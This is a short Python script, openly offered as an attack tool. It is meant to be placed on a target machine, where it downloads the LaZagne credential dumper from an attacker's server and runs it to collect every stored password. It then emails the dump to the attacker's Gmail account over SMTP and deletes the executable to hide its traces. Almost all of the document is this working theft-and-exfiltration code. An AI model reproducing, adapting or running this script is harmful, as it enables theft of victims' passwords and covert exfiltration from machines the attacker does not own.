#!/usr/bin/env python

#Get this file into target machine, run it, and it will download Lazagne.exe, send you an email and delete itself.
#Use in MiTM-attacks:
import requests, subprocess, smtplib, os

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def sendmail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#make sure  you are hosting a local server with laZagne.exe
download("THE HTTP SERVER WHERE YOU HOST THE FILE lazagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
sendmail("YOUR GMAIL HERE", "PASSWORD HERE", result)
os.remove("laZagne.exe")